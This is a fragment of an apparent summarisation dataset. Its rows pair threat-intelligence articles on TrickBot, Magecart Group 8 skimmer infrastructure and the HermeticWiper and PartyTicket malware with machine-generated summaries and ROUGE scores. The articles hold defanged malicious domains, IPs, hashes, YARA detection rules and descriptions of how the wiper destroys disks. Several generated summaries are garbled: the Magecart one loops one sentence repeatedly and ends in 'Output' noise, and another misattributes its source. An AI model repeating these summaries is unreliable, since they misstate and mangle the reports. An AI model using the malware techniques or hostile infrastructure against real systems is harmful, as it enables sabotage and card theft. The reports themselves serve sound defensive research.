below.IOCsPDB paths:D:\Project\masrv\build-masrv\debug\Desktop_msvc_15_0_32bit\masrv.pdb D:\Project\masrv\build-masrv\debug\Desktop_msvc_15_0_64bit\masrv.pdbModule Name SHA256 Description masrvDll32 2c29de91a5be3bffafb521e04b88819d23c6f71843c8f2d54516ec2afefd24c6 32-bit DLL masrvDll64 e1c5a377450d04372bfe9d943d322fbdd53c274c3772836eb044fd2a4b08a870 64-bit DLLYARArule TrickBot__masrvDll { meta: id = ""4kWjG0InTDyHiur8cCzPeG"" fingerprint = ""3e91c19602340a43e026ffdb23b1d6a0c4e186d67f743e962c75aa51ea0c4d1c"" version = ""1.0"" first_imported = ""2021-01-29"" last_modified = ""2021-01-29"" status = ""RELEASED"" sharing = ""TLP:WHITE"" source = ""KRYPTOS LOGIC"" description = ""Detects TrickBot masrvDll module"" category = ""MALWARE"" malware = ""BOT"" strings: $a = ""http://127.0.0.1:8080/gid/uid/pcap.exe"" $b = ""c:\\\\temp\\\\maserv.txt"" $c = ""Send cmd to server: %s\\r\"" $d = ""HTTP message success: URI=%s DATA=%.*s\\r\"" condition: all of them }References";HTTP message success: URI=127.0.0.1:8080/mor2/JOHNPC_W617601.CC081DEDCA3EE2CECFA265AF5C904BF3/mass/freq DATA=1000 Detects TrickBot masrvDll module;en;{'r': 0.01697792869269949, 'p': 0.8333333333333334, 'f': 0.033277869824945114};{'r': 0.006134969325153374, 'p': 0.5, 'f': 0.012121211881726358};{'r': 0.01697792869269949, 'p': 0.8333333333333334, 'f': 0.033277869824945114}
https://cofenselabs.com/all-you-need-is-text-second-wave/;All You Need Is Text: Second Wave – Cofense Labs;"As we have noted before, attackers will leverage any file format they can to evade security protections put in place by their targets. (https://cofenselabs.com/all-you-need-is-text/).On Jun 11, 2020 we noticed an odd file extension show up in our analysis pipeline.It was a jnlp file. The jnlp extension is short for ""Java Network Launch Protocol"" and is a filetype used by Java with Java Web Start to load a java application. The file itself is a simple XML based format that is easily readable. This however did not stop this file type from evading a secure email gateway and finding its way in to a real estate industry mailbox.The jnlp file format utilizes a similar URL building logic as we've seen in another technique dubbed 'basestriker' where by the primary domain and the path are separate entities. This may be the reason that this file format was selected. Below is the text of one of those files:If this file was clicked and the user had java installed a couple of things would happen:1) Java would load up the WHO website to make the user think the file is legitimate.2) Java will also load the domain plus the ""map.jar"" file as the path and pull down and execute that jar file.We analyzed this and found that once the jar file is loaded, it downloads an exe which further loads TrickBot. This can be seen in the following decompilation of that file:Traffic analysis of the infection chain confirmed our findings with typical C2 traffic that is seen from TrickBot, but with a gtag we have not seen before, chil.While TrickBot is not a new threat, this delivery chain is highly unusual. Leveraging the coronavirus as a lure as well as an uncommon file type likely to evade secure email gateways for delivery, and it's not hard to see how this could be a very effective campaign.MD5 (Application-Covid19.jnlp) = 51c0790a43c22efd4972b98283c45a98MD5 (SARS-2_Form.jnlp) = 51c0790a43c22efd4972b98283c45a98MD5 (map.exe) = dda70ed5f8e93b2456f593e8da46e464MD5 (map.jar) = a716ca7b680734cb0ea6fa479b4da7a7URL: https://mapcovid[.]net/map.jarURL: https://basecovid[.]com/map.exeC2: 134.119.191[.]12";"The ITSecurity report states that attackers will leverage any file format they can to evade security protections put in place by their targets. On Jun 11, 2020 we noticed an odd file extension show up in our analysis pipeline. It was a jnlp file. The jnlp extension is short for ""Java Network Launch Protocol"" and is a filetype used by Java with Java Web Start to load a java application. The file itself is a simple XML based format that is easily readable. This however did not stop this file type from evading a secure email gateway and finding its way in to a real estate industry mailbox. If this file was clicked and the user had java installed a couple of things would happen: 1) Java would load up the WHO website to make the user think the file is legitimate. 2) Java will also load the domain plus the ""map.jar"" file as the path and pull down and execute that jar file. We analyzed this and found that once the jar file is loaded, it downloads an exe which further loads TrickBot. This can be seen in the following decompilation of that file: Traffic analysis of the infection chain confirmed our findings with typical C2 traffic that is seen from TrickBot, but with a gtag we have not seen before, chil. While TrickBot is not a new threat, this delivery chain is highly unusual. Leveraging the coronavirus as a lure as well as an uncommon file type likely to evade secure email gateways for delivery, and it's not hard to see how this could be a very effective campaign. MD5 (ApplicationCovid19.jnlp) = 51c0790a43c22efd4972b98283c4";en;{'r': 0.7729468599033816, 'p': 0.9411764705882353, 'f': 0.8488063610959058};{'r': 0.7668711656441718, 'p': 0.9363295880149812, 'f': 0.8431703154542172};{'r': 0.7729468599033816, 'p': 0.9411764705882353, 'f': 0.8488063610959058}
https://www.malwarebytes.com/blog/threat-intelligence/2021/09/the-many-tentacles-of-magecart-group-8;The many tentacles of Magecart Group 8;"Posted: September 13, 2021 byIn this blog we follow different leads to unravel sprawling infrastructure used by Magecart Group 8.This blog post was authored by Jerome SeguraDuring the past couple of years online shopping has continued to increase at a rapid pace. In a recent survey done by Qubit, 70.7% of shoppers said they increased their online shopping frequency compared to before COVID-19.Criminals gravitate towards opportunities, and these trends have made digital skimming attacks such as Magecart all the more profitable.To protect our customers, we need to constantly look out for novel attacks. Having said that, we sometimes need to check for past ones too. In fact, many threat actors will reuse certain patterns or resources which allows us to make connections with previous incidents.One Magecart group that has left a substantial amount of bread crumbs from their skimming activity has been documented under various names (Group 8, CoffeMokko, Keeper, FBseo). It is believed to be one of the older threat actors in the digital skimming space.In this blog post, we publish a number of connections within their infrastructure usage that we've been able to uncover by cross-referencing several data sources.Reconnecting with Magecart Group 8In a recent article, RiskIQ researchers unravelled a large part of the infrastructure used by Magecart Group 8 and how they migrated to different hosts in particular Flowspec and OVH over time.We had been looking at Group 8 also, but starting from a different angle. Back in June we were checking skimmer code that looked somewhat different than anything we could categorize. We didn't think much of it until in July Eric Brandel tweeted about a skimmer he called 'checkcheck' that was using some interesting new features and was essentially the same thing we had found.After some additional research we noticed that some parts of the code were unique but not new. In particular the exfiltration of credit card data was using a string swapping function identical to the one used by the 'CoffeMokko' family described by Group-IB. In their blog, they mention some overlap with the original Group 1 (RiskIQ) that was eventually merged into what is now Group 8.From there, we were reacquainted with a threat group that we had not seen in a while but that had been busy. There were a number of domain names that were new to us. We rapidly got down a rabbit hole and lost track of the big picture. However, the blog from RiskIQ helped to put some perspective on one part of the infrastructure that we referred to as Flowspec - OVH.Most of the domains and IP addresses have already been covered by RiskIQ. However we were to create some mapping that showed some interesting historical connections between well-known past campaigns. In Part 1, we will explore those links.We had also uncovered another large part of infrastructure while reporting our findings on 'checkcheck' to Eric Brandel. Then in August, Denis tweeted about some of those domains which interestingly are old but somehow managed to stay low for a long time. We will review those in Part 2.Part 1: Flowspec and OVHThe RiskIQ article describes this part of the infrastructure in great details. We will review some connecting points that allowed us to rediscover older campaigns. Flowspec is a known bulletproof hosting service that has been used beyond just skimmers, but also for phishing, ransomware and other malware.[1] The domain safeprocessor[.]com was hosted at 176.121.14[.]103 (Flowspec) and 178.33.231[.]184 (OVH). It was listed in the indicators of compromise (IOCs) from Gemini Advisory's ""Keeper"" Magecart Group Infects 570 Sites blog post. On the same OVH IP is the domain foodandcot[.]com listed in the IOCs section for Group-IB's Meet the JS-Sniffers 4: CoffeMokko Family.[2] scriptopia[.]net was also on 176.121.14[.]103 (Flowspec) and 178.33.71[.]232 (OVH). The domain was spotted by Dmitry Bestuzhev on the website for a Chilean wine. Other domains on that IP were also caught by Rommel.[3] mirasvit[.]net shares the same registrant as scriptopia[.]net. It was hosted at 194.87.144[.]10 and 176.121.14[.]143 (Flowspec). That IP address came across Denis' radar in a tweet and was largely covered by RiskIQ.[4] shourve[.]com shares the same registrant as the other skimmer domains hosted at 178.33.71[.]232. It was hosted at 5.135.247[.]142. On that same IP is adaptivestyles[.]com which shared the same registrant as scriptopia[.]net, and fileskeeper[.]org from which Gemini Advisory derived the name of their blog post.[5] stairany[.]com hosted at 5.135.247[.]141 (OVH) appeared in a report by CSIS Group. Another domain on that IP address is clipboardplugin[.]com which was mentioned by Felix Aime along with a screenshot of a carding website.[6] csjquery[.]com shares the same registrant as stairany[.]com and is hosted at 169.239.129[.]35 (ZAPPIE-HOST). On that IP are hundreds of carding sites.[7] zoplm[.]com hosted at 37.59.47[.]208 (OVH) and 51.83.209[.]11 (OVH) shares the same registrant as cigarpaqe[.]com and fleldsupply[.]com mentioned in our blog using Homoglyph domains.[8] 176.121.14[.]189 (Flowspec) was covered by RiskIQ for its number of skimmer domains that later moved to Velia.net hosting.Part 2: ICME and Crex Fex PexThis bit of infrastructure was interesting because it tied back to activity we saw from domains like jquery[.]su. This was actually the starting point of our investigation, which eventually led to Part 1: Flowspec and OVH and back to Group 8.Crex Fex Pex (?????-????-????) refers to a Russian play with a character that looks like Pinocchio. However in our case it is a bulletproof hoster that has seen significant skimmer activity.[1] gstaticx[.]com was hosted at 217.8.117[.]166 (Crex Fex Pex) and 185.246.130[.]169 (ICME). We can see a recent compromise here, and the skimmer (which uses that character swapping function) in particular here.[2] googletagnamager[.]com hosted at 217.8.117[.]141 (Crex Fex Pex) shared the same registrant as gstaticx[.]com. Interestingly, one version of this skimmer from googletagnamager[.]com/ki/x19.js loaded JavaScript from jquery[.]su.We can find a similar path structure at jquery[.]su/ki/x2.js which also references the same min-1.12.4.js script. A version of this script can be seen here (capture).[3] The domain jquery[.]su was registered by alexander.colmakov2017@yandex[.]ru. The same email address was used to register serversoftwarebase[.]com which is connected to brute force attacks against various CMS. In that blog post, we mention googletagmanager[.]eu hosted at 185.68.93[.]22 which is associated with a campaign against MySQL/Adminer.[4] googletagmanages[.]com has the same registrant as googletagnamager[.]com. contrary to the other domains we've seen so far, this one is on Amazon. Reviewing the IP addresses which hosted it (AS14618-Amazon), we find hundreds of typosquat domains for skimming (see IOCs section for list). It seems though that most were not used, perhaps just kept for a rainy day.Digital skimming artifactsWhile checking this infrastructure we came across a number of artifacts related to web skimming activity including webshells, panels, and other tools. With such a sprawling network, it's not hard to imagine that the criminals themselves may have a tough time keeping track of everything they have.Tracking digital skimmers is a time consuming effort where one might easily get lost in the noise. Criminals are constantly setting up new servers and moving things around. In addition, with the help of bulletproof services, they make it difficult to disrupt their infrastructure.However we and many researchers regularly publish information that helps to identify and block new domains and IP addresses. We also work with law enforcement and have reported many of these artifacts, in particular the stolen customer data. Finally, we also notify merchants although too many are still unaware of this threat and lack the proper contact details.Malwarebytes customers are protected against digital skimmers thanks to the web protection module available in our consumer and enterprise products.Indicators of Compromise (IOCs)Skimmer domainsadaptivestyles[.]comagilityscripts[.]comamazonawscdn[.]comanduansury[.]comankese[.]comassetstorage[.]netbootstrapmag[.]combraincdn[.]orgcdncontainer[.]comcdnforplugins[.]comchatajax[.]comcigarpaqe[.]comclipboardplugin[.]comcsjquery[.]comdevlibscdn[.]comfileskeeper[.]orgfleldsupply[.]comfoodandcot[.]comfreshchat[.]infofreshdepor[.]comfrocklay[.]comgoogle-adware[.]comhottrackcdn[.]comhqassets[.]comjquery-apl[.]comjqueryalert[.]comjqueryapiscript[.]comjsassets[.]netjsvault[.]netmage-checkout[.]orgmagento-info[.]commagento-stores[.]commagento-updater[.]commechat[.]infomirasvit[.]netpanelsaveok[.]compaypaypay[.]orgpayprocessor[.]netpushcrew[.]pwsafeprocessor[.]comsagecdn[.]orgsainester[.]comscriptdesire[.]comscriptopia[.]netsecure4d[.]netsecurity-magento[.]comsecurity-payment[.]susecurityscr[.]comseoagregator[.]comshoppersbaycdn[.]comshourve[.]comslickjs[.]orgspeedtransaction[.]comspotforassets[.]comstairany[.]comswappastore[.]comtheresevit[.]comunderscorefw[.]comv2-zopim[.]comverywellfitnesse[.]comw3schooli[.]comwebadstracker[.]comwebscriptcdn[.]comwinqsupply[.]comwordpress-scripts[.]comzoplm[.]comadwords-track[.]comadwords-track[.]topcarders[.]bestcdn-secure[.]netclickinks-api[.]comdrhorveys[.]comdrnarveys[.]comfaviconx[.]comfont-staticx[.]comfonts-googleapi[.]comfontsctatic[.]comfontsctaticx[.]comfontsgoooglestatic[.]comfontstatics[.]comfontstaticx[.]comfrontstatics[.]comg-staticx[.]comga-track[.]comgctatic[.]comgctatics[.]comgoogle-tagmanager[.]comgoogleatagmanager[.]comgooglestag[.]comgooglestaticx[.]comgooglestatix[.]comgoogletagmahager[.]comgoogletagmamager[.]comgoogletagmanagen[.]comgoogletagmanages[.]comgoogletagnamager[.]comgoogletaqmanager[.]comgoogletaqmanaqer[.]comgstaticx[.]comgstaticxs[.]comhs-scrlpts[.]comjquery-statistika[.]infojquery[.]suscaraabresearch[.]comstaticzd-assets[.]comv2zopim[.]comvalidcvv[.]ruRelated IP addresses169[.]239[.]129[.]35176[.]121[.]14[.]103176[.]121[.]14[.]143176[.]121[.]14[.]189178[.]33[.]231[.]184178[.]33[.]71[.]232194[.]87[.]144[.]1037[.]59[.]47[.]2085[.]135[.]247[.]1415[.]135[.]247[.]14251[.]83[.]209[.]1154[.]38[.]49[.]244185[.]209[.]161[.]143185[.]246[.]130[.]169193[.]105[.]134[.]147217[.]8[.]117[.]140217[.]8[.]117[.]141217[.]8[.]117[.]1665[.]188[.]44[.]3274[.]119[.]239[.]23476[.]119[.]1[.]11291[.]215[.]152[.]133Typosquatgoogheusercontent[.]comgooglatagmanager[.]comgooglausercontent[.]comgoogle5sercontent[.]comgoogleafalytics[.]comgoogleanadytics[.]comgoogleanahytics[.]comgoogleanal9tics[.]comgoogleanalxtics[.]comgoogleanaly4ics[.]comgoogleanalydics[.]comgoogleanalypics[.]comgoogleanalytacs[.]comgoogleanalytias[.]comgoogleanalytibs[.]comgoogleanalyticc[.]comgoogleanalyticr[.]comgoogleanalyticw[.]comgoogleanalytigs[.]comgoogleanalytiks[.]comgoogleanalytkcs[.]comgoogleanalytmcs[.]comgoogleanalytycs[.]comgoogleanalyuics[.]comgoogleanalyvics[.]comgoogleanamytics[.]comgoogleananytics[.]comgoogleanclytics[.]comgoogleanelytics[.]comgoogleanilytics[.]comgoogleanqlytics[.]comgoogleaoalytics[.]comgooglecnalytics[.]comgoogledagmanager[.]comgoogleenalytics[.]comgoogleesercontent[.]comgoogleinalytics[.]comgooglepagmanager[.]comgoogleqnalytics[.]comgoogleqsercontent[.]comgoogletacmanager[.]comgoogletaemanager[.]comgoogletag-anager[.]comgoogletageanager[.]comgoogletagianager[.]comgoogletaglanager[.]comgoogletagmafager[.]comgoogletagmajager[.]comgoogletagmalager[.]comgoogletagmanacer[.]comgoogletagmanaeer[.]comgoogletagmanafer[.]comgoogletagmanagar[.]comgoogletagmanagdr[.]comgoogletagmanage2[.]comgoogletagmanageb[.]comgoogletagmanagep[.]comgoogletagmanages[.]comgoogletagmanagev[.]comgoogletagmanagez[.]comgoogletagmanaggr[.]comgoogletagmanagmr[.]comgoogletagmanagur[.]comgoogletagmanaoer[.]comgoogletagmanawer[.]comgoogletagmancger[.]comgoogletagmaneger[.]comgoogletagmaniger[.]comgoogletagmanqger[.]comgoogletagmaoager[.]comgoogletagmcnager[.]comgoogletagminager[.]comgoogletagmqnager[.]comgoogletagoanager[.]comgoogletaomanager[.]comgoogletawmanager[.]comgoogletcgmanager[.]comgoogletigmanager[.]comgoogletqgmanager[.]comgoogletsercontent[.]comgoogleu3ercontent[.]comgoogleuagmanager[.]comgoogleucercontent[.]comgoogleuqercontent[.]com";"The RiskIQ article describes this part of the infrastructure in great details. We will review some connecting points that allowed us to rediscover older campaigns. Flowspec is a known bulletproof hosting service that has been used beyond just skimmers, but also for phishing, ransomware and other malware. [1] The domain safeprocessor[. ]com was hosted at 176.121.14[. ]103 (Flowspec) and 178.33.231[. ]184 (OVH). It was listed in the indicators of compromise (IOCs) from Gemini Advisory's ""Keeper"" Magecart Group Infects 570 Sites blog post. On the same OVH IP is the domain foodandcot[. ]com listed in the IOCs section for GroupIB's Meet the JSSniffers 4: CoffeMokko Family. [2] scriptopia[. Scriptopia.net, Mirasvit.net, Shourve.com, Adaptivestyles.com, Fileskeeper.org, Stairany.com, Clipboardplugin.com, and CSjQuery.com all share the same registrant. Scriptopia.net, Mirasvit.net, Shourve.com, Adaptivestyles.com, Fileskeeper.org, Stairany.com, Clipboardplugin.com, and CSjQuery.com all share the same registrant. Scriptopia.net, Mirasvit.net, Shourve.com, Adaptivestyles.com, Fileskeeper.org, Stairany.com, Clipboardplugin.com, and CSjQuery.com all share the same registrant. Scriptopia.net, Mirasvit.net, Shourve.com, Adaptivestyles.com, Fileskeeper.org, Stairany.com, Clipboardplugin.com, and CSjQuery.com all share the same registrant. Scriptopia.net, Mirasvit.net, Shourve.com, Adaptivestyles.com, Fileskeeper.org, Stairany.com, Clipboardplugin.com, and CSjQuery.com all share the same registrant. Scriptopia.net, Mirasvit.net, Shourve.com, Adaptivestyles.com, Fileskeeper.org, Stairany.com, Clipboardplugin.com, and CSjQuery.com all share the same registrant. Scriptopia.net, Mirasvit.net, Shourve.com, Adaptivestyles.com, Fileskeeper.org, Stairany.com, Clipboardplugin.com, and CSjQuery.com all share the same registrant. Script Part 1: Flowspec and OVH and back to Group 8 ICME and Crex Fex Pex ICME (?????????????) refers to a Russian play with a character that looks like Pinocchio. However in our case it is a bulletproof hoster that has seen significant skimmer activity. [1] gstaticx[. ]com was hosted at 217.8.117[. ]166 (Crex Fex Pex) and 185.246.130[. ]169 (ICME). We can see a recent compromise here, and the skimmer (which uses that character swapping function) in particular here. [2] googletagnamager[. ]com hosted at 217.8.117[. ]141 (Crex Fex Pex) shared the same registrant as gstaticx[.]com. Interestingly, one version of this skimmer from googletagnamager[. ]com/ki/x19.js loaded JavaScript from jquery[. Part 2: ICME and Crex Fex Pex ICME (?????????????) refers to a Russian play with a character that looks like Pinocchio. However in our case it is a bulletproof hoster that has seen significant skimmer activity. [1] gstaticx[. ]com was hosted at 217.8.117[. ]166 (Crex Fex Pex) and 185.246.130[. ]169 (ICME). We can see a recent compromise here, and the skimmer (which uses that character swapping function) in particular here. [2] googletagnamager Output Output Output:Output Output Output:output: . . . . . : : : : : : , the following. . . . . . . . . . . . . . . . . .";en;{'r': 0.17852975495915985, 'p': 0.8595505617977528, 'f': 0.29565217106497704};{'r': 0.14195361911454674, 'p': 0.8112449799196787, 'f': 0.24162679172346818};{'r': 0.17852975495915985, 'p': 0.8595505617977528, 'f': 0.29565217106497704}
https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/;HermeticWiper | New Destructive Malware Used In Cyber Attacks on Ukraine;"This post was updated Feb 28th 2022 to include new IOCs and the PartyTicket 'decoy ransomware'.Executive SummaryOn February 23rd, the threat intelligence community began observing a new wiper malware sample circulating in Ukrainian organizations.Our analysis shows a signed driver is being used to deploy a wiper that targets Windows devices, manipulating the MBR resulting in subsequent boot failure.This blog includes the technical details of the wiper, dubbed HermeticWiper, and includes IOCs to allow organizations to stay protected from this attack.This sample is actively being used against Ukrainian organizations, and this blog will be updated as more information becomes available.We also analyze a 'ransomware', called PartyTicket, reportedly used as a decoy during wiping operations.SentinelOne customers are protected from this threat, no action is needed.BackgroundOn February 23rd, our friends at Symantec and ESET research tweeted hashes associated with a wiper attack in Ukraine, including one which is not publicly available as of this writing.We started analyzing this new wiper malware, calling it 'HermeticWiper' in reference to the digital certificate used to sign the sample. The digital certificate is issued under the company name 'Hermetica Digital Ltd' and valid as of April 2021. At this time, we haven't seen any legitimate files signed with this certificate. It's possible that the attackers used a shell company or appropriated a defunct company to issue this digital certificate.This is an early effort to analyze the first available sample of HermeticWiper. We recognize that the situation on the ground in Ukraine is evolving rapidly and hope that we can contribute our small part to the collective analysis effort.Technical AnalysisAt first glance, HermeticWiper appears to be a custom-written application with very few standard functions. The malware sample is 114KBs in size and roughly 70% of that is composed of resources. The developers are using a tried and tested technique of wiper malware, abusing a benign partition management driver, in order to carry out the more damaging components of their attacks. Both the Lazarus Group (Destover) and APT33 (Shamoon) took advantage of Eldos Rawdisk in order to get direct userland access to the filesystem without calling Windows APIs. HermeticWiper uses a similar technique by abusing a different driver, empntdrv.sys .The copies of the driver are ms-compressed resources. The malware deploys one of these depending on the OS version, bitness, and SysWow64 redirection.The benign EaseUS driver is abused to do a fair share of the heavy-lifting when it comes to accessing Physical Drives directly as well as getting partition information. This adds to the difficulty of analyzing HermeticWiper, as a lot of functionality is deferred to DeviceIoControl calls with specific IOCTLs.MBR and Partition CorruptionHermeticWiper enumerates a range of Physical Drives multiple times, from 0-100. For each Physical Drive, the \\.\EPMNTDRV\ device is called for a device number.The malware then focuses on corrupting the first 512 bytes, the Master Boot Record (MBR) for every Physical Drive. While that should be enough for the device not to boot again, HermeticWiper proceeds to enumerate the partitions for all possible drives.They then differentiate between FAT and NTFS partitions. In the case of a FAT partition, the malware calls the same 'bit fiddler' to corrupt the partition. For NTFS, the HermeticWiper parses the Master File Table before calling this same bit fiddling function again.We euphemistically refer to the bit fiddling function in the interest of brevity. Looking through it, we see calls to Windows APIs to acquire a cryptographic context provider and generate random bytes. It's likely this is being used for an inlined crypto implementation and byte overwriting, but the mechanism isn't entirely clear at this time.Further functionality refers to interesting MFT fields ( $bitmap , $logfile ) and NTFS streams ( $DATA , $I30 , $INDEX_ALLOCATION ). The malware also enumerates common folders ('My Documents', 'Desktop', 'AppData'), makes references to the registry ('ntuser'), and Windows Event Logs ( ""\\\\?\\C:\\Windows\\System32\\winevt\\Logs"" ). Our analysis is ongoing to determine how this functionality is being used, but it is clear that having already corrupted the MBR and partitions for all drives, the victim system should be inoperable by this point of the execution.Along the way, HermeticWiper's more mundane operations provide us with further IOCs to monitor for. These include the momentary creation of the abused driver as well as a system service. It also modifies several registry keys, including setting the SYSTEM\CurrentControlSet\Control\CrashControl CrashDumpEnabled key to 0, effectively disabling crash dumps before the abused driver's execution starts.Finally, the malware waits on sleeping threads before initiating a system shutdown, finalizing the malware's devastating effect.A Decoy Ransomware - PartyTicketOn February 24th, 2022, Symantec researchers pointed to a new Go ransomware being used as a decoy alongside the deployment of HermeticWiper. During out analysis we decided to name it PartyTicket based on some of the strings used by the malware developers:The idea of using a ransomware as a decoy for a wiper is counterintuitive. In particular, a ransomware as poorly coded as PartyTicket is more likely to tie up resources during the execution of an otherwise efficient wiper.As often happens to amateur Go developers, the malware has poor control over its concurrent threads and the commands it attempts to run. This leads to hundreds of threads and events spawned in our consoles. That is to say, it's a very loud and ineffective ransomware that should fire alerts left and right.The folder organization and function naming conventions within the binary show the developer's intent for taunting the U.S. Government and the Biden administration.Similar taunting can be found in the ransom note after execution:In trying to understand the execution flow of PartyTicket, we see the 403forBiden.wHiteHousE.primaryElectionProcess() function recursively enumerating folders:The resulting number of folders will be used as an upperbound for concurrent threads, a mistake by the Go devs as that effectively ties up all of the system's resources. While the files found are all queued into a channel for the threads to reference.The function indirectly called for each thread is main.subscribeNewPartyMember() . It in turn takes a filename, makes a copy with a <UUID>.exe name and deletes the original file. Then we expect a second loop to relieve that queue of files and run each through a standard Go AES crypto implementation. However, execution is unlikely to get this far with the current design of PartyTicket.(Thanks to Joakim Kennedy (Intezer) for pointing out this indirect call)Overall our analysis of PartyTicket indicates it to be a rather simple, poorly coded, and loud malware. Its possible role as a decoy ransomware deployed alongside HermeticWiper is more likely to be effective for its accidental hogging of the victim organization's system resources rather than the encryption of files itself. IOCs and Yara rules have been added below.ConclusionAfter a week of defacements and increasing DDoS attacks, the proliferation of sabotage operations through wiper malware is an expected and regrettable escalation. At this time, we have a very small sliver of aperture into the attacks in Ukraine and subsequent spillover into neighboring countries and allies. If there's a silver lining to such a difficult situation, it's seeing the open collaboration between threat intel research teams, independent researchers, and journalists looking to get the story straight. Our thanks to the researchers at Symantec, ESET, Stairwell, and RedCanary among others who've contributed samples, time, and expertise.SentinelOne Customers ProtectedIndicators of Compromise(Updated February 28th, 2022)ms-compressed resources SHA1 RCDATA_DRV_X64 5ceebaf1cbb0c10b95f7edd458804a646c6f215e RCDATA_DRV_X86 0231721ef4e4519ec776ff7d1f25c937545ce9f4 RCDATA_DRV_XP_X64 9c2e465e8dfdfc1c0c472e0a34a7614d796294af RCDATA_DRV_XP_X86 ee764632adedf6bb4cf4075a20b4f6a79b8f94c0HermeticWiper SHA1 Win32 EXE 0d8cc992f279ec45e8b8dfd05a700ff1f0437f29 Win32 EXE 61b25d11392172e587d8da3045812a66c3385451 Win32 EXE 912342f1c840a42f6b74132f8a7c4ffe7d40fb77 Win32 EXE 9518e4ae0862ae871cf9fb634b50b07c66a2c379 Win32 EXE d9a3596af0463797df4ff25b7999184946e3bfa2PartyTicket SHA-1 Win32 EXE f32d791ec9e6385a91b45942c230f52aff1626dfYARA Rules(https://github.com/SentineLabs/Yara/blob/main/APT_RU_SunFlowerSeed.yar)import ""pe"" rule MAL_HERMETIC_WIPER { meta: desc = ""Hermetic Wiper - broad hunting rule"" author = ""Hegel @ SentinelLabs"" version = ""1.0"" last_modified = ""02.23.2022"" hash = ""1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591"" reference = ""https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/"" strings: $string1 = ""DRV_XP_X64"" wide ascii nocase $string2 = ""EPMNTDRV\\%u"" wide ascii nocase $string3 = ""PhysicalDrive%u"" wide ascii nocase $cert1 = ""Hermetica Digital Ltd"" wide ascii nocase condition: uint16(0) == 0x5A4D and all of them } rule MAL_PARTY_TICKET { meta: desc = ""PartyTicket / HermeticRansom Golang Ransomware - associated with HermeticWiper campaign"" author = ""Hegel @ SentinelLabs"" version = ""1.0"" last_modified = ""02.24.2022"" hash = ""4dc13bb83a16d4ff9865a51b3e4d24112327c526c1392e14d56f20d6f4eaf382"" reference = ""https://twitter.com/juanandres_gs/status/1496930731351805953"" strings: $string1 = ""/403forBiden/"" wide ascii nocase $string2 = ""/wHiteHousE/"" wide ascii $string3 = ""vote_result."" wide ascii $string4 = ""partyTicket."" wide ascii $buildid1 = ""Go build ID: \""qb0H7AdWAYDzfMA1J80B/nJ9FF8fupJl4qnE4WvA5/PWkwEJfKUrRbYN59_Jba/2o0VIyvqINFbLsDsFyL2\"""" wide ascii $project1 = ""C:/projects/403forBiden/wHiteHousE/"" wide ascii condition: uint16(0) == 0x5A4D and (2 of ($string*) or any of ($buildid*) or any of ($project*)) } rule MAL_COMPROMISED_HERMETICA_CERT { meta: desc = ""Hermetica Cert - broad hunting rule based on the certificate used in HermeticWiper and HermeticWizard"" author = ""Hegel @ SentinelLabs"" version = ""1.0"" last_modified = ""03.01.2022"" hash = ""1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591"" reference = ""https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/"" condition: uint16(0) == 0x5a4d and for any i in (0 .. pe.number_of_signatures) : ( pe.signatures[i].issuer contains ""DigiCert EV Code Signing CA"" and pe.signatures[i].serial == ""0c:48:73:28:73:ac:8c:ce:ba:f8:f0:e1:e8:32:9c:ec"" ) } rule MAL_ISSAC_WIPER { meta: desc = ""Issac Wiper - broad hunting rule"" author = ""Hegel @ SentinelLabs"" version = ""1.0"" last_modified = ""03.01.2022"" hash = ""13037b749aa4b1eda538fda26d6ac41c8f7b1d02d83f47b0d187dd645154e033"" reference = ""https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/"" strings: $name1 = ""Cleaner.dll"" wide ascii $name2 = ""cl.exe"" wide ascii nocase $name3 = ""cl64.dll"" wide ascii nocase $name4 = ""cld.dll"" wide ascii nocase $name5 = ""cll.dll"" wide ascii nocase $name6 = ""Cleaner.exe"" wide ascii $export = ""[email protected]"" wide ascii condition: uint16(0) == 0x5A4D and (any of ($name*) and $export) } rule MAL_HERMETIC_WIZARD { meta: desc = ""HermeticWizard hunting rule"" author = ""Hegel @ SentinelLabs"" version = ""1.0"" last_modified = ""03.01.2022"" reference = ""https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/"" strings: $name1 = ""Wizard.dll"" wide ascii $name2 = ""romance.dll"" wide ascii $name3 = ""exec_32.dll"" wide ascii $function1 = ""DNSGetCacheDataTable"" wide ascii $function2 = ""GetIpNetTable"" wide ascii $function3 = ""WNetOpenEnumW"" wide ascii $function4 = ""NetServerEnum"" wide ascii $function5 = ""GetTcpTable"" wide ascii $function6 = ""GetAdaptersAddresses"" wide ascii $function7 = ""GetEnvironmentStrings"" wide ascii $ip_anchor1 = ""192.168.255.255"" wide ascii condition: uint16(0) == 0x5A4D and (any of ($function*) and any of ($name*) and $ip_anchor1) }SentinelOne STAR RulesEventType = ""Process Creation"" AND TgtProcPublisher = ""HERMETICA DIGITAL LTD"" AND ( SrcProcSignedStatus = ""signed"" AND IndicatorPersistenceCount = ""2"" AND RegistryValue = ""4"" AND RegistryKeyPath = ""MACHINE\SYSTEM\ControlSet001\Services\VSS\Start"" ) AND SrcProcImagePath !~ ""devsetup64.exe""";"HermeticWiper is a sophisticated malware designed to corrupt the Master Boot Record (MBR) and partitions of a victim system, rendering it inoperable. The malware enumerates a range of Physical Drives multiple times, from 0100. For each Physical Drive, the \\.\EPMNTDRV\ device is called for a device number. The malware then focuses on corrupting the first 512 bytes, the Master Boot Record (MBR) for every Physical Drive. While that should be enough for the device not to boot again, HermeticWiper proceeds to enumerate the partitions for all possible drives. They then differentiate between FAT and NTFS partitions. In the case of a FAT partition, the malware calls the same 'bit fiddler' to corrupt the partition. For NTFS, the HermeticWiper parses the Master File Table before calling this same bit fiddling function again. We euphemistically refer to the bit fiddling function in the interest of brevity. Further functionality refers to interesting MFT fields ( $bitmap , $logfile ) and NTFS streams ( $DATA , $I30 , $INDEX_ALLOCATION ). The malware also enumerates common folders ('My Documents', 'Desktop', 'AppData'), makes references to the registry ('ntuser'), and Windows Event Logs ( ""\\\\?\\C:\\Windows\\System32\\winevt\\Logs"" ). Our analysis is ongoing to determine how this functionality is being used, but it is clear that having already corrupted the MBR and partitions for all drives, the victim system should be inoperable by this point of the execution. Along the way, HermeticWiper's more mundane 